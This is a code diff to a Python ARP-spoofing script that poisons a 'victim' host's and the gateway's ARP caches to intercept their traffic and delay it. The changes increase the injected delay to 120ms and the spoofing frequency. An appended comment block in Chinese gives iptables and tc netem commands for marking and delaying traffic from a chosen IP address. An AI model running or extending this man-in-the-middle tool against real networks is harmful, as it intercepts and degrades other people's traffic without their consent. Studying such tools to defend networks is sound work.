@@ -167,7 +167,7 @@ def remove_network_delay_for_ip(interface, source_ip):
 
 if __name__ == "__main__":
     # Customize the delay as needed -> delay when forwarding packet
-    delay_time = "15ms"
+    delay_time = "120ms"
     # indicate specific interface
     network_interface = "ens2"
     # victim ip address
@@ -193,11 +193,24 @@ if __name__ == "__main__":
             # telling the `host` that we are the `target`
             spoof(gateway_ip, gateway_mac, target_ip, verbose)
             # sleep for few second
-            time.sleep(5)
+            time.sleep(1)
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
         restore(target_ip, gateway_ip)
         restore(gateway_ip, target_ip)
         if "nt" not in os.name:
             _disable_linux_iproute()
-            remove_network_delay_for_ip(network_interface)
+            remove_network_delay_for_ip(network_interface, target_ip)
+
+
+'''
+添加 iptables 规则 : sudo iptables -A INPUT -s 192.168.10.25 -j MARK --set-mark 1
+查看 iptables : sudo iptables -L
+设置 tc 队列规则:
+sudo tc qdisc add dev ens33 root handle 1: prio # 为接口 ens33 添加一个优先级队列
+sudo tc filter add dev ens33 parent 1: protocol ip handle 1 fw flowid 1:1 # 基于 iptables 中标记的 MARK（值为 1）来筛选流量
+sudo tc qdisc add dev ens33 parent 1:1 handle 10: netem delay 15ms # 为所有标记为 1 的流量添加了 15ms 的延迟
+取消 iptables 规则: sudo iptables -D INPUT -s 192.168.10.25 -j MARK --set-mark 1
+删除 tc 队列规则 ( 所有 ): sudo tc qdisc del dev ens33 root
+顯示 tc 規則: sudo tc -s qdisc show dev ens33
+'''
